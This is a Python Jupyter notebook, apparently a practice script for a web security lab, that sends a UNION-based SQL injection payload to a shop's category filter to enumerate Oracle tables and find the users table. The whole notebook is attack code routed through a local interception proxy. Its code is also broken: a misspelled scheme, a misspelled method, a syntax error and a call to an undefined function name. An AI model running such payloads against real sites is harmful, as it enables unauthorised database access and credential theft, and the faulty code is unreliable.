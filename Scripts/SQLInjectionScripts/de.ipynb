{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  },
  "orig_nbformat": 4,
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.9.7 64-bit"
  },
  "interpreter": {
   "hash": "767d51c1340bd893661ea55ea3124f6de3c7a262a8b4abca0554b478b1e2ff90"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import sys\n",
    "import urllib3\n",
    "from bs4 import BeautifulSoup\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def perform_request(url, sql_payload):\n",
    "    path=\"/filter?category=Gifts\"\n",
    "    r=requests.get(url+path+sql_payload,verify=False,proxies=proxies)\n",
    "    return r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def sqli_userrs_table(url):\n",
    "    sql_payload=\" ' UNION SELECT table_name, NULL FROM all_tables--\"\n",
    "    res=perform_request(url,sql_payload)\n",
    "    soup=BeautifulSoup(res,'html.parser')\n",
    "    #we need to make some regex operation\n",
    "    users_table=soup.find(text=re.compile('^USERS\\_*'))\n",
    "    return users_table"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#For the script we must know number of columns, data type of columns \n",
    "urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n",
    "proxies= {'http': 'htttp://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}\n",
    "\n",
    "if __name__==\"__main__\":\n",
    "    try:\n",
    "        url=sys.argv[1].stript()\n",
    "    except IndexError\n",
    "        print(\"[-] Usage: %s <url>\" %sys.argv[0])\n",
    "        print(\"[-] Example: %s example.com\" %sys.argv[0])\n",
    "        sys.exit(-1)\n",
    "    \n",
    "\n",
    "    print(\"Looking for the users table...\")\n",
    "    users_table= sqli_users_table(url)\n",
    "    if users_table:\n",
    "        print(\"Found the users table name: %s\" %users_table)\n",
    "    else:\n",
    "        print(\"Did not find a users table\")\n"
   ]
  }
 ]
}